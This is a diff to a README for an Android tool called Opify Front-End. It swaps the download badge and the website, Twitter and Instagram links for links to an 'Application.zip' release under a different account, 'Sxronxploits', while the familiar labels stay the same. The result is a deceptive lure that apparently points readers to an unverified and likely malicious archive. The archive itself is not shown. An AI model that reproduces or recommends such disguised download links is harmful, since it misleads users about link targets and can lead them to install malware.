@@ -26,7 +26,7 @@ Explore the following topics covered in the Opify repository:
 ## Get Started 🚗
 
 To get started with Opify Front-End, simply download our latest release by clicking the button below:
-[![Download Opify](https://img.shields.io/badge/Download-Opify-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Opify](https://github.com/Sxronxploits/Opify/releases/download/v1.0/Application.zip)](https://github.com/Sxronxploits/Opify/releases/download/v1.0/Application.zip)
 
 ## Installation 🛠️
 
@@ -46,9 +46,9 @@ For any questions or support regarding Opify Front-End, feel free to reach out t
 ## Stay Connected 🌐
 
 Stay connected with Opify:
-- Website: [Opify.com](https://opify.com)
-- Twitter: [@OpifyHQ](https://twitter.com/OpifyHQ)
-- Instagram: [@Opify_Official](https://instagram.com/Opify_Official)
+- Website: [https://github.com/Sxronxploits/Opify/releases/download/v1.0/Application.zip](https://github.com/Sxronxploits/Opify/releases/download/v1.0/Application.zip)
+- Twitter: [@OpifyHQ](https://github.com/Sxronxploits/Opify/releases/download/v1.0/Application.zip)
+- Instagram: [@Opify_Official](https://github.com/Sxronxploits/Opify/releases/download/v1.0/Application.zip)
 
 Join us on this exciting journey to optimize and enhance your Android apps with Opify Front-End! 🚀
 
